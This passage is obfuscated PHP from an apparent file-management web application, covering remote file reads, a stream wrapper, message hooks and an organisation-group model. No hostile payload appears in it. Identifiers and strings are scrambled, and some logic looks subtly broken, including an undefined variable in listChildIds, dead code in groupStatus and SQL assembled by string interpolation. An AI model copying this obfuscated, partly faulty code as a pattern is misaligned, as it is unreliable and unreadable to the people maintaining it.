get_path_ext($Ä€¤àÆí[$ÏÄÖñïí[32]]), $ÏÄÖñïí[1478] => $Ùğ–§åä > 0 && $Ä€¤àÆí[$ÏÄÖñïí[1628]], $ÏÄÖñïí[1479] => !1); return $öÅ«âƒ±; } private function header($ÄÉœÜú‚) { $Ìíø´İ‰ =& $_SERVER[™¸œØ®Ü]; if (isset(self::$_cacheHeader[$ÄÉœÜú‚])) { return self::$_cacheHeader[$ÄÉœÜú‚]; } $²„Äé® = isset($GLOBALS[$Ìíø´İ‰[1629]]) ? $GLOBALS[$Ìíø´İ‰[1629]] : !1; $GLOBALS[$Ìíø´İ‰[1629]] = !0; self::$_cacheHeader[$ÄÉœÜú‚] = url_header($ÄÉœÜú‚); $GLOBALS[$Ìíø´İ‰[1629]] = $²„Äé®; return self::$_cacheHeader[$ÄÉœÜú‚]; } public function hashSimple($ãŞ¶Ê­ù, $ù³Óö§ = false) { $™Àëğœ€ =& $_SERVER[™¸œØ®Ü]; $Ïî‰·­ = $this->info($ãŞ¶Ê­ù); if (!$Ïî‰·­ || !$Ïî‰·­[$™Àëğœ€[234]]) { return !1; } $—Í–—œŠ = $Ïî‰·­[$™Àëğœ€[79]]; $ùèò¶„Š = 200; $¢·Ï¯¥Œ = 50; if ($—Í–—œŠ <= $ùèò¶„Š * $¢·Ï¯¥Œ) { return md5($this->fileSubstr($ãŞ¶Ê­ù, 0, $—Í–—œŠ)) . $—Í–—œŠ; } $Î´ ¨…œ = intval($—Í–—œŠ / $¢·Ï¯¥Œ); $µş€› = $™Àëğœ€[12]; $ÑÚ¸´¦Ö = timeFloat(); $œ»ÒÛëİ = 15; for ($º‘ÆôÉÚ = 0; $º‘ÆôÉÚ < $¢·Ï¯¥Œ; $º‘ÆôÉÚ++) { if (timeFloat() - $ÑÚ¸´¦Ö > $œ»ÒÛëİ) { return !1; } $Úş²‘Œà = $this->fileSubstr($ãŞ¶Ê­ù, $Î´ ¨…œ * $º‘ÆôÉÚ, $ùèò¶„Š); if (!$Úş²‘Œà) { return !1; } $µş€› .= $Úş²‘Œà; } $µş€› .= $this->fileSubstr($ãŞ¶Ê­ù, $—Í–—œŠ - $ùèò¶„Š, $ùèò¶„Š); return md5($µş€›) . $—Í–—œŠ; } public function getContent($»Ç®³ü) { return $this->fileSubstr($»Ç®³ü); } public function fileSubstr($à¿‚ƒé, $Ê Ü¸Ù£ = 0, $€š‘ââ = -1) { $ÚÈ°”“å =& $_SERVER[™¸œØ®Ü]; $ÇÏ•ƒó = $this->info($à¿‚ƒé); if (!$ÇÏ•ƒó || !$ÇÏ•ƒó[$ÚÈ°”“å[234]] && $ÇÏ•ƒó[$ÚÈ°”“å[79]] > 1024 * 1024 * 10) { return !1; } if ($€š‘ââ === -1) { $€š‘ââ = $ÇÏ•ƒó[$ÚÈ°”“å[79]]; } if ($€š‘ââ == 0) { return $ÚÈ°”“å[12]; } $ÉÅô³´ = array($ÚÈ°”“å[1630] . $Ê Ü¸Ù£ . $ÚÈ°”“å[872] . ($Ê Ü¸Ù£ + $€š‘ââ - 1)); $âÃåæ¦ = url_request($à¿‚ƒé, $ÚÈ°”“å[1518], !1, $ÉÅô³´, !1, !1, 30); return $âÃåæ¦[$ÚÈ°”“å[1306]] ? $âÃåæ¦[$ÚÈ°”“å[1306]] : $ÚÈ°”“å[12]; } public function download($¥ÂÊ¶ƒ, $„·¥µ¤¢) { Downloader::start($¥ÂÊ¶ƒ, $„·¥µ¤¢); return $„·¥µ¤¢; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ç±„¶ŠÄ, $è¦¢ÌÉ = '') { $this->info = $this->info($ç±„¶ŠÄ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[™¸œØ®Ü][87]]; $this->pathOpen = $ç±„¶ŠÄ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ç±„¶ŠÄ])) { self::$_chunkBuffer[$ç±„¶ŠÄ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ŒÁ–Ôª) { $ÜØëÍû = $this->fileSubstr($this->pose, $ŒÁ–Ôª); $this->pose += strlen($ÜØëÍû); return $ÜØëÍû; } public function stream_tell() { return $this->pose; } public function stream_seek($÷‹ê¥ß, $¨„œÉßÊ) { $ÖØÆ±åÏ =& $_SERVER[™¸œØ®Ü]; if ($¨„œÉßÊ == SEEK_SET) { $this->pose = $÷‹ê¥ß; } else { if ($¨„œÉßÊ == SEEK_CUR) { $this->pose += $÷‹ê¥ß; } else { if ($¨„œÉßÊ == SEEK_END) { $this->pose = $this->info[$ÖØÆ±åÏ[79]] + intval($÷‹ê¥ß); } } } if ($÷‹ê¥ß < 0) { $this->pose = $this->info[$ÖØÆ±åÏ[79]] + $÷‹ê¥ß; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[™¸œØ®Ü][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÁÇÉ¦, $ÏáÍèƒ) { $»¤¿ıÀî =& $_SERVER[™¸œØ®Ü]; $Œ¶¨“òÆ = $this->info($ÁÇÉ¦); return array($»¤¿ıÀî[1419] => 0, $»¤¿ıÀî[1631] => 0, $»¤¿ıÀî[16] => 32768 + 511, $»¤¿ıÀî[1632] => 0, $»¤¿ıÀî[1633] => 0, $»¤¿ıÀî[1634] => 0, $»¤¿ıÀî[1635] => 0, $»¤¿ıÀî[79] => $Œ¶¨“òÆ[$»¤¿ıÀî[79]], $»¤¿ıÀî[1636] => $Œ¶¨“òÆ[$»¤¿ıÀî[1477]], $»¤¿ıÀî[1593] => $Œ¶¨“òÆ[$»¤¿ıÀî[88]], $»¤¿ıÀî[1592] => $Œ¶¨“òÆ[$»¤¿ıÀî[233]], $»¤¿ıÀî[1637] => 0, $»¤¿ıÀî[1638] => 0); } static $fileInfo = array(); public function info($óƒ†îïÄ) { $œäø³ä© = $_SERVER[™¸œØ®Ü][1639]; if (isset(self::$fileInfo[$óƒ†îïÄ])) { return self::$fileInfo[$óƒ†îïÄ]; } if (substr($óƒ†îïÄ, 0, strlen($œäø³ä©)) != $œäø³ä©) { return !1; } self::$fileInfo[$óƒ†îïÄ] = IO::info(substr($óƒ†îïÄ, strlen($œäø³ä©))); return self::$fileInfo[$óƒ†îïÄ]; } public static function read($Ãş¶Ä‘, $Ïã¯ğ¸•, $üğøë„„) { if (!isset(self::$_fopenCache[$Ãş¶Ä‘])) { $ üËŒ› = new StreamWrapperIO(); $ üËŒ›->stream_open($Ãş¶Ä‘); self::$_fopenCache[$Ãş¶Ä‘] = $ üËŒ›; } $ üËŒ› = self::$_fopenCache[$Ãş¶Ä‘]; return $ üËŒ›->fileSubstr($Ïã¯ğ¸•, $üğøë„„); } public static function _read($Õ•§…°ó, $×¦İì¾, $ı¦Ô‡óŠ) { $—îşæµ¡ =& $_SERVER[™¸œØ®Ü]; $‰ø”Î‰È = fopen($Õ•§…°ó, $—îşæµ¡[1481]); if (!$‰ø”Î‰È) { return $—îşæµ¡[12]; } $ ½´ñÖÉ = 8192; fseek($‰ø”Î‰È, $×¦İì¾, SEEK_SET); $¯÷„õ = $—îşæµ¡[12]; $îå½şäó = 0; while ($îå½şäó < $ı¦Ô‡óŠ) { $Û÷˜Ü² = min($ ½´ñÖÉ, $ı¦Ô‡óŠ - $îå½şäó); $¯÷„õ .= fread($‰ø”Î‰È, $Û÷˜Ü²); $îå½şäó += $Û÷˜Ü²; } fclose($‰ø”Î‰È); return $¯÷„õ; } public function fileSubstr($Ì“â¸ÜÏ, $¿œµöŞÀ) { $ï½Éâ¡’ =& $_SERVER[™¸œØ®Ü]; $²§ÕÃäâ = $this->info[$ï½Éâ¡’[79]]; $½³›°¸ = $Ì“â¸ÜÏ; $¶ˆëĞ±Ê = $¿œµöŞÀ; if ($Ì“â¸ÜÏ < 0) { $Ì“â¸ÜÏ = $²§ÕÃäâ + $Ì“â¸ÜÏ; } if ($¿œµöŞÀ === !1) { $¿œµöŞÀ = $²§ÕÃäâ - $Ì“â¸ÜÏ; } if ($Ì“â¸ÜÏ + $¿œµöŞÀ > $²§ÕÃäâ) { $¿œµöŞÀ = $²§ÕÃäâ - $Ì“â¸ÜÏ; } if ($¿œµöŞÀ <= 0) { return $ï½Éâ¡’[12]; } if ($Ì“â¸ÜÏ < 0 || $Ì“â¸ÜÏ >= $²§ÕÃäâ || $¿œµöŞÀ <= 0 || $¿œµöŞÀ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\154\x65\x52\145\141\x64\x20\x65\162\x72\x6f\162\x21\40\163\164\141\x72\x74\x3d{$Ì“â¸ÜÏ}\73\154\145\x6e\147\x74\150\x3d{$¿œµöŞÀ}\73\x20\x73\x69\x7a\145\x3d{$²§ÕÃäâ}\x3b"); } $éÜöíÃæ = 64 * 1024; $–øÇˆë’ =& self::$_chunkBuffer[$this->path]; if (!$–øÇˆë’) { $–øÇˆë’ = array(); } $µœÄ›å = 0; $‘êÆÏèİ = 0; $ö·ïë±İ = $ï½Éâ¡’[12]; foreach ($–øÇˆë’ as $µœÄ›å => $ö·ïë±İ) { $µœÄ›å = intval($µœÄ›å); $‘êÆÏèİ = $µœÄ›å + strlen($ö·ïë±İ); if ($Ì“â¸ÜÏ >= $‘êÆÏèİ) { continue; } if ($Ì“â¸ÜÏ >= $µœÄ›å && $Ì“â¸ÜÏ + $¿œµöŞÀ <= $‘êÆÏèİ) { return substr($ö·ïë±İ, $Ì“â¸ÜÏ - $µœÄ›å, $¿œµöŞÀ); } break; } if (count($–øÇˆë’) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ï½Éâ¡’[1640], $ï½Éâ¡’[1641] . count($–øÇˆë’) . "\x3b\163\x74\141\162\164\75{$Ì“â¸ÜÏ}\54\154\x65\156\147\x74\150\75{$¿œµöŞÀ}\73\160\157\x73\145\x3a{$µœÄ›å}\x7e{$‘êÆÏèİ}"); throw new Exception($ï½Éâ¡’[1642]); } $úıåúß’ = intval($Ì“â¸ÜÏ / $éÜöíÃæ) * $éÜöíÃæ; $Áíòæê© = ceil(($Ì“â¸ÜÏ + $¿œµöŞÀ) / $éÜöíÃæ) * $éÜöíÃæ - $úıåúß’; $ŸË‡éö = IO::fileSubstr($this->path, $úıåúß’, $Áíòæê©); $–øÇˆë’[$úıåúß’ . $ï½Éâ¡’[12]] = $ŸË‡éö; ksort($–øÇˆë’); $Ï›×İ—Ö = substr($ŸË‡éö, $Ì“â¸ÜÏ - $úıåúß’, $¿œµöŞÀ); return $Ï›×İ—Ö; } private function log($è¤ìµ, $ŸãôšŸÆ) { $ÍŠ Š˜ =& $_SERVER[™¸œØ®Ü]; $†¥çà¬‚ = timeFloat() - $this->timeStart; write_log(sprintf($ÍŠ Š˜[1643], $è¤ìµ, $this->info[$ÍŠ Š˜[32]], $†¥çà¬‚, $ŸãôšŸÆ), $ÍŠ Š˜[1283]); } } class Message { function __construct() { } public function send($áİÔ˜¹Î = '', $à§¶‹æË = array(), $à­”§äÔ = "\164\145\x78\x74") { $İëäîçğ =& $_SERVER[™¸œØ®Ü]; $ÃÄ§Úù = array($İëäîçğ[33] => $İëäîçğ[1232], $İëäîçğ[171] => $áİÔ˜¹Î); if (in_array($à­”§äÔ, array($İëäîçğ[1232], $İëäîçğ[1644]))) { $ÃÄ§Úù[$İëäîçğ[33]] = $à­”§äÔ; } $à§¶‹æË = array($İëäîçğ[582] => isset($à§¶‹æË[$İëäîçğ[582]]) ? $à§¶‹æË[$İëäîçğ[582]] : $İëäîçğ[12], $İëäîçğ[669] => isset($à§¶‹æË[$İëäîçğ[669]]) ? $à§¶‹æË[$İëäîçğ[669]] : $İëäîçğ[12]); if (empty($áİÔ˜¹Î) || empty($à§¶‹æË[$İëäîçğ[582]]) && empty($à§¶‹æË[$İëäîçğ[669]])) { return !1; } $ºœÌó… = array($İëäîçğ[1573] => $ÃÄ§Úù, $İëäîçğ[1645] => $à§¶‹æË); Hook::trigger($İëäîçğ[1646], $ºœÌó…); } } goto eŞÙò¼¾„ô; E¿¯Î Ø‰­: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\155\x65" => "\147\x72\x6f\165\x70\x5f\155\145\164\141", "\155\x65\164\141\106\x69\145\x6c\x64" => "\x67\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($çñÊİ§) { $Ùû‰í =& $_SERVER[™¸œØ®Ü]; return array($Ùû‰í[2078] => array($çñÊİ§[0], $Ùû‰í[2079]), $Ùû‰í[2080] => array($çñÊİ§[0], $Ùû‰í[2081])); } protected function getInfo($õˆ‚Êàª, $¸÷¦’¢ = false) { $Ÿşªş Å = $this->getInfoSimple($õˆ‚Êàª); if (!$Ÿşªş Å) { return !1; } if ($¸÷¦’¢) { return $this->_listDataApplyItem($Ÿşªş Å); } return $this->cacheFunctionGet($_SERVER[™¸œØ®Ü][2082], $õˆ‚Êàª); } protected function getInfoSimple($·„¶½×‰, $ÓÍæÅšİ = false) { $…„Â©Óì =& $_SERVER[™¸œØ®Ü]; if ($ÓÍæÅšİ) { $‘ÂÖäÎ­ = array($…„Â©Óì[1996] => intval($·„¶½×‰)); $¤ÊóÃò = $this->where($‘ÂÖäÎ­)->find(); return is_array($¤ÊóÃò) ? $¤ÊóÃò : array(); } return $this->cacheFunctionGet($…„Â©Óì[2083], $·„¶½×‰); } protected function groupAdd($½ÃİÔç) { $ÊàŒ©‡™ =& $_SERVER[™¸œØ®Ü]; if (!$½ÃİÔç[$ÊàŒ©‡™[192]] && isset($½ÃİÔç[$ÊàŒ©‡™[1996]]) && $½ÃİÔç[$ÊàŒ©‡™[1996]] == 1) { if ($ØõÒÇµ¡ = $this->getInfoSimple($½ÃİÔç[$ÊàŒ©‡™[1996]], !0)) { return $½ÃİÔç[$ÊàŒ©‡™[1996]]; } } else { $ØõÒÇµ¡ = $this->getInfoSimple($½ÃİÔç[$ÊàŒ©‡™[192]]); if (!$ØõÒÇµ¡) { return !1; } } $ëÄòÉšÚ = $ÊàŒ©‡™[597]; if ($ØõÒÇµ¡[$ÊàŒ©‡™[588]]) { $ëÄòÉšÚ = $ØõÒÇµ¡[$ÊàŒ©‡™[588]] . $ØõÒÇµ¡[$ÊàŒ©‡™[1996]] . $ÊàŒ©‡™[50]; } $û‚ó–¡× = array($ÊàŒ©‡™[496] => $this->groupNameAuto($½ÃİÔç[$ÊàŒ©‡™[192]], $½ÃİÔç[$ÊàŒ©‡™[32]]), $ÊàŒ©‡™[479] => $½ÃİÔç[$ÊàŒ©‡™[192]], $ÊàŒ©‡™[659] => $ëÄòÉšÚ, $ÊàŒ©‡™[2084] => $½ÃİÔç[$ÊàŒ©‡™[1982]], $ÊàŒ©‡™[2085] => 0, $ÊàŒ©‡™[2000] => 0); if (isset($½ÃİÔç[$ÊàŒ©‡™[2020]])) { $û‚ó–¡×[$ÊàŒ©‡™[2020]] = $½ÃİÔç[$ÊàŒ©‡™[2020]]; } else { $Šî²ÜúÉ = $this->max($ÊàŒ©‡™[2020]); if (!$Šî²ÜúÉ) { $Šî²ÜúÉ = 0; } $û‚ó–¡×[$ÊàŒ©‡™[2020]] = $Šî²ÜúÉ + 1; } if (!empty($½ÃİÔç[$ÊàŒ©‡™[1996]])) { $û‚ó–¡×[$ÊàŒ©‡™[1996]] = $½ÃİÔç[$ÊàŒ©‡™[1996]]; } $é¨ñÁ½ = $this->add($û‚ó–¡×); $this->setNamePinyin($é¨ñÁ½, $û‚ó–¡×[$ÊàŒ©‡™[32]]); if (isset($½ÃİÔç[$ÊàŒ©‡™[2086]])) { $this->metaSet($é¨ñÁ½, array($ÊàŒ©‡™[2086] => $½ÃİÔç[$ÊàŒ©‡™[2086]], $ÊàŒ©‡™[2087] => $½ÃİÔç[$ÊàŒ©‡™[2087]])); unset($½ÃİÔç[$ÊàŒ©‡™[2086]]); unset($½ÃİÔç[$ÊàŒ©‡™[2087]]); } Model($ÊàŒ©‡™[1440])->groupRootAdd($é¨ñÁ½); $this->_clearCache($½ÃİÔç[$ÊàŒ©‡™[192]]); return $é¨ñÁ½; } protected function groupEdit($·ÈËßš, $ÊûË×) { $ùÈ•¨â˜ =& $_SERVER[™¸œØ®Ü]; $¯ıÎ¯Ÿ = $this->getInfoSimple($·ÈËßš); if (!$¯ıÎ¯Ÿ) { return !1; } if (!empty($ÊûË×[$ùÈ•¨â˜[192]])) { $ÄŞÈ¶„¾ = $this->getInfoSimple($ÊûË×[$ùÈ•¨â˜[192]]); if (!$ÄŞÈ¶„¾) { return !1; } if ($¯ıÎ¯Ÿ[$ùÈ•¨â˜[1996]] == $ÄŞÈ¶„¾[$ùÈ•¨â˜[1996]]) { return !1; } if ($ÊûË×[$ùÈ•¨â˜[192]] != $¯ıÎ¯Ÿ[$ùÈ•¨â˜[192]]) { if ($ÄŞÈ¶„¾[$ùÈ•¨â˜[588]] !== $¯ıÎ¯Ÿ[$ùÈ•¨â˜[588]] && strpos($ÄŞÈ¶„¾[$ùÈ•¨â˜[588]], $¯ıÎ¯Ÿ[$ùÈ•¨â˜[588]] . $¯ıÎ¯Ÿ[$ùÈ•¨â˜[1996]] . $ùÈ•¨â˜[50]) === 0) { return !1; } $ÊûË×[$ùÈ•¨â˜[659]] = $ÄŞÈ¶„¾[$ùÈ•¨â˜[588]] . $ÊûË×[$ùÈ•¨â˜[192]] . $ùÈ•¨â˜[50]; $this->_changeChildLevel($¯ıÎ¯Ÿ, $ÄŞÈ¶„¾); $this->_clearCache($ÄŞÈ¶„¾[$ùÈ•¨â˜[1996]]); $this->_clearCache($¯ıÎ¯Ÿ[$ùÈ•¨â˜[192]]); } } if (isset($ÊûË×[$ùÈ•¨â˜[32]])) { $this->setNamePinyin($·ÈËßš, $ÊûË×[$ùÈ•¨â˜[32]]); } if (isset($ÊûË×[$ùÈ•¨â˜[2086]])) { $this->metaSet($·ÈËßš, array($ùÈ•¨â˜[2086] => $ÊûË×[$ùÈ•¨â˜[2086]], $ùÈ•¨â˜[2087] => $ÊûË×[$ùÈ•¨â˜[2087]])); unset($ÊûË×[$ùÈ•¨â˜[2086]]); unset($ÊûË×[$ùÈ•¨â˜[2087]]); } $this->_clearChildrenCache($¯ıÎ¯Ÿ); return $this->where(array($ùÈ•¨â˜[2088] => $·ÈËßš))->save($ÊûË×); } private function _clearChildrenCache($Ô²Í¾Ì€) { $¾úšÓ¼† =& $_SERVER[™¸œØ®Ü]; $”ßÚé‡ = array($¾úšÓ¼†[659] => array($¾úšÓ¼†[619], $Ô²Í¾Ì€[$¾úšÓ¼†[588]] . $Ô²Í¾Ì€[$¾úšÓ¼†[1996]] . $¾úšÓ¼†[620])); $ıÍµñÍè = $this->field($¾úšÓ¼†[1996])->where($”ßÚé‡)->select(); foreach ($ıÍµñÍè as $È°è†ùÂ) { $this->_clearCache($È°è†ùÂ[$¾úšÓ¼†[1996]]); } } private function _clearCache($Ã±§›‚Û) { $İ±Éò¢Î =& $_SERVER[™¸œØ®Ü]; $this->cacheFunctionClear($İ±Éò¢Î[2082], $Ã±§›‚Û); $this->cacheFunctionClear($İ±Éò¢Î[2083], $Ã±§›‚Û); } private function _changeChildLevel($­—ÄŞé, $øğ¬¼åø, $†«ÜÎß– = false) { $¤†Ìäê‰ =& $_SERVER[™¸œØ®Ü]; $„ İà¤Š = $­—ÄŞé[$¤†Ìäê‰[588]] . $­—ÄŞé[$¤†Ìäê‰[1996]] . $¤†Ìäê‰[50]; $ÜòúÕ › = $øğ¬¼åø[$¤†Ìäê‰[588]] . $øğ¬¼åø[$¤†Ìäê‰[1996]] . $¤†Ìäê‰[50] . $­—ÄŞé[$¤†Ìäê‰[1996]] . $¤†Ìäê‰[50]; if ($†«ÜÎß–) { $ÜòúÕ › = $øğ¬¼åø[$¤†Ìäê‰[588]] . $øğ¬¼åø[$¤†Ìäê‰[1996]] . $¤†Ìäê‰[50]; } $ìƒ÷õõ£ = array($¤†Ìäê‰[659] => array($¤†Ìäê‰[619], $­—ÄŞé[$¤†Ìäê‰[588]] . $­—ÄŞé[$¤†Ìäê‰[1996]] . $¤†Ìäê‰[620])); $±Šı…£ä = array($¤†Ìäê‰[659] => array($¤†Ìäê‰[668], "\x72\x65\x70\154\x61\x63\145\x28\x70\x61\162\145\156\x74\114\x65\166\145\x6c\54\47{$„ İà¤Š}\47\54\47{$ÜòúÕ ›}\47\x29")); $this->_clearChildrenCache($­—ÄŞé); $this->where($ìƒ÷õõ£)->data($±Šı…£ä)->save(); } public function setNamePinyin($Ûªôİ¥ú, $ñ¢ØÉ = false) { $ğ¦Ê«Ã× =& $_SERVER[™¸œØ®Ü]; if (!$ñ¢ØÉ) { $ˆñÂ©ûÈ = $this->getInfoSimple($Ûªôİ¥ú); $ñ¢ØÉ = $ˆñÂ©ûÈ[$ğ¦Ê«Ã×[32]]; } if (!Input::check($ñ¢ØÉ, $ğ¦Ê«Ã×[662])) { $this->metaSet($Ûªôİ¥ú, $ğ¦Ê«Ã×[540], null); $this->metaSet($Ûªôİ¥ú, $ğ¦Ê«Ã×[539], null); return; } $·„é¤¡õ = array($ğ¦Ê«Ã×[540] => str_replace($ğ¦Ê«Ã×[53], $ğ¦Ê«Ã×[12], Pinyin::get($ñ¢ØÉ)), $ğ¦Ê«Ã×[539] => Pinyin::get($ñ¢ØÉ, $ğ¦Ê«Ã×[663])); $this->metaSet($Ûªôİ¥ú, $·„é¤¡õ); } protected function metaSet($Û“Ï²Ø¬, $†äæ‹œ = null, $ÖÈâœ§˜ = null) { $this->_clearCache($Û“Ï²Ø¬); return parent::metaSet($Û“Ï²Ø¬, $†äæ‹œ, $ÖÈâœ§˜); } protected function groupStatus($Æóñãè±, $†Ì´È«Ô) { $¥Ø©ÒÁ =& $_SERVER[™¸œØ®Ü]; $ÚïÑ²í = $this->getInfoSimple($Æóñãè±); if (!$ÚïÑ²í) { return !1; } $this->_clearCache($Æóñãè±); return $this->metaSet($Æóñãè±, $¥Ø©ÒÁ[835], $†Ì´È«Ô); if ($†Ì´È«Ô == $¥Ø©ÒÁ[91]) { $ºÄĞé¹š = $this->parentLevelArray($ÚïÑ²í[$¥Ø©ÒÁ[588]]); } else { } $ºÄĞé¹š[] = $ÚïÑ²í[$¥Ø©ÒÁ[1996]]; $Ğã¡ŒÀÍ = array(); foreach ($ºÄĞé¹š as $Æóñãè±) { $Ğã¡ŒÀÍ[] = array($¥Ø©ÒÁ[1996] => $Æóñãè±, $¥Ø©ÒÁ[97] => $¥Ø©ÒÁ[835], $¥Ø©ÒÁ[452] => $†Ì´È«Ô); $this->_clearCache($Æóñãè±); } return Model($¥Ø©ÒÁ[2089])->addAll($Ğã¡ŒÀÍ, array(), !0); } protected function groupRemove($çš¥ıŸ¥, $¥ÍµòÍÕ = false) { $ŸÂŞ²Ä =& $_SERVER[™¸œØ®Ü]; $ª«ÚÅı = array($ŸÂŞ²Ä[1996] => $çš¥ıŸ¥); $üß¹À¼Ò = $this->where($ª«ÚÅı)->find(); if (!$üß¹À¼Ò || $üß¹À¼Ò[$ŸÂŞ²Ä[192]] == 0) { return !1; } if (!$¥ÍµòÍÕ) { $£è°Šê‘ = $this->getInfoSimple($üß¹À¼Ò[$ŸÂŞ²Ä[192]]); $this->_changeChildLevel($üß¹À¼Ò, $£è°Šê‘, !0); $this->where(array($ŸÂŞ²Ä[192] => $çš¥ıŸ¥))->save(array($ŸÂŞ²Ä[192] => $üß¹À¼Ò[$ŸÂŞ²Ä[192]])); $this->_clearCache($£è°Šê‘[$ŸÂŞ²Ä[1996]]); } Model($ŸÂŞ²Ä[2089])->where($ª«ÚÅı)->delete(); Model($ŸÂŞ²Ä[2090])->where($ª«ÚÅı)->delete(); Model($ŸÂŞ²Ä[915])->groupRootRemove($çš¥ıŸ¥); $this->_clearCache($üß¹À¼Ò[$ŸÂŞ²Ä[192]]); return $this->where($ª«ÚÅı)->delete(); } protected function groupSort($û¤ˆÇÅ‘) { $è—¥À²‰ =& $_SERVER[™¸œØ®Ü]; $®¤Ñ©Ø¼ = array(); foreach ($û¤ˆÇÅ‘ as $»£Á¢¸ƒ => $÷­ùóè) { $®¤Ñ©Ø¼[] = array($è—¥À²‰[1996], $÷­ùóè, $è—¥À²‰[2020], $»£Á¢¸ƒ + 1); } $this->saveAll($®¤Ñ©Ø¼); } public function listData() { $·ŸÍùó˜ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($·ŸÍùó˜[$_SERVER[™¸œØ®Ü][447]]); return $·ŸÍùó˜; } private function _makeOrder($ŠØå² = '') { $§ÓŒá =& $_SERVER[™¸œØ®Ü]; $áîèĞ¶Š = array($§ÓŒá[1996], $§ÓŒá[32], $§ÓŒá[1984], $§ÓŒá[233]); $êì÷¼Ô§ = array($§ÓŒá[525] => $§ÓŒá[526], $§ÓŒá[527] => $§ÓŒá[528]); $ñóÏøÎ“ = Input::get($§ÓŒá[532], $§ÓŒá[7], $§ÓŒá[2000], $áîèĞ¶Š); $š‚®›Ÿú = Input::get($§ÓŒá[533], $§ÓŒá[7], $§ÓŒá[2091], array($§ÓŒá[2091], $§ÓŒá[527])); $š‚®›Ÿú = $êì÷¼Ô§[$š‚®›Ÿú]; $ŠØå² = $ŠØå² . "{$ñóÏøÎ“}\x20{$š‚®›Ÿú}\x2c\40\x67\x72\157\x75\160\x49\104\40\141\163\143"; return $this->order($ŠØå²); } public function listChild($–œíµ‚) { $‰˜ŠÈ©¼ =& $_SERVER[™¸œØ®Ü]; $“í•ĞÒ = $this->where(array($‰˜ŠÈ©¼[192] => $–œíµ‚))->_makeOrder()->selectPage(200); $this->_listDataApply($“í•ĞÒ[$‰˜ŠÈ©¼[447]]); return $“í•ĞÒ; } public function listChildIds($—„œß¸) { $³’ğ…± =& $_SERVER[™¸œØ®Ü]; if (is_string($óºúŞı¬)) { $—„œß¸ = explode($³’ğ…±[50], $—„œß¸); } $ßŸˆŸ§ = $this->where(array($³’ğ…±[1996] => array($³’ğ…±[7], $—„œß¸)))->field($³’ğ…±[2092])->select(); if (!$ßŸˆŸ§) { return !1; } $ÈØÌüïğ = array(); foreach ($ßŸˆŸ§ as $Í”Â‘ü‚) { $ÈØÌüïğ[] = "\163\x65\154\x65\143\164\x20\x67\x72\x6f\165\160\x49\104\x20\x66\162\x6f\155\x20\140\x67\x72\157\165\160\140\x20\167\150\145\162\145\40\160\141\x72\x65\x6e\164\x4c\145\166\145\x6c\x20\x6c\x69\153\145\x20\47{$Í”Â‘ü‚[$³’ğ…±[588]]}{$Í”Â‘ü‚[$³’ğ…±[1996]]}\x2c\45\47"; } $ÈØÌüïğ = implode($³’ğ…±[2093], $ÈØÌüïğ); $ßŸˆŸ§ = $this->query($ÈØÌüïğ); if (!$ßŸˆŸ§) { return array(); } $—„œß¸ = array_to_keyvalue($ßŸˆŸ§, $³’ğ…±[12], $³’ğ…±[1996]); return array_unique($—„œß¸); } public function listByID($¯Åî‘šË) { $ÏõĞ¾ÛŒ =& $_SERVER[™¸œØ®Ü]; if (!$¯Åî‘šË) { return array(); } $†Äôü—è = array($ÏõĞ¾ÛŒ[1996] => array($ÏõĞ¾ÛŒ[7], $¯Åî‘šË)); $Š©Õ‘ò = $this->where($†Äôü—è)->select(); $Š©Õ‘ò = array_sort_keep($Š©Õ‘ò, $ÏõĞ¾ÛŒ[1996], $¯Åî‘šË); $this->_listDataApply($Š©Õ‘ò); return $Š©Õ‘ò; } public function listSearch($¬úÌ¥İ²) { $Ö »€ş‹ =& $_SERVER[™¸œØ®Ü]; $¸¾ş‘’ = trim($¬úÌ¥İ²[$Ö »€ş‹[2094]]); $ŠÎšó = explode($Ö »€ş‹[53], $¸¾ş‘’); if (!$¸¾ş‘’ || count($ŠÎšó) == 1) { return $this->listSearchNow($¬úÌ¥İ²); } $íô«êÓÛ = array($Ö »€ş‹[447] => array()); foreach ($ŠÎšó as $È†§àÄĞ) { if (!trim($È†§àÄĞ)) { continue; } $¬úÌ¥İ²[$Ö »€ş‹[2094]] = $È†§àÄĞ; $ÄæËõ–¥ = $this->listSearchNow($¬úÌ¥İ²); $íô«êÓÛ[$Ö »€ş‹[447]] = array_merge($íô«êÓÛ[$Ö »€ş‹[447]], $ÄæËõ–¥[$Ö »€ş‹[447]]); } $íô«êÓÛ[$Ö »€ş‹[447]] = array_unique_by_key($íô«êÓÛ[$Ö »€ş‹[447]], $Ö »€ş‹[1996]); $íô«êÓÛ[$Ö »€ş‹[444]] = array($Ö »€ş‹[445] => count($íô«êÓÛ[$Ö »€ş‹[447]]), $Ö »€ş‹[441] => 20, $Ö »€ş‹[430] => 1, $Ö »€ş‹[446] => 1); return $íô«êÓÛ; } public function listSearchNow($½ûıµ¤‹) { $À÷‹”à¦ =& $_SERVER[™¸œØ®Ü]; $©ï·¢— = trim($½ûıµ¤‹[$À÷‹”à¦[2094]]); $Û¶ßËïÒ = isset($½ûıµ¤‹[$À÷‹”à¦[2095]]) ? $½ûıµ¤‹[$À÷‹”à¦[2095]] : !1; if (!trim($©ï·¢—)) { return !1; } $©ï·¢— = str_replace($À÷‹”à¦[2096], $À÷‹”à¦[2097], $©ï·¢—); $¨ÌìĞ‘ò = array($À÷‹”à¦[1996] => array($À÷‹”à¦[461], "{$©ï·¢—}\45"), $À÷‹”à¦[32] => array($À÷‹”à¦[461], "\x25{$©ï·¢—}\x25"), $À÷‹”à¦[1096] => $À÷‹”à¦[2098]); if ($Û¶ßËïÒ) { $¸††ä  = $this->getInfoSimple($Û¶ßËïÒ); 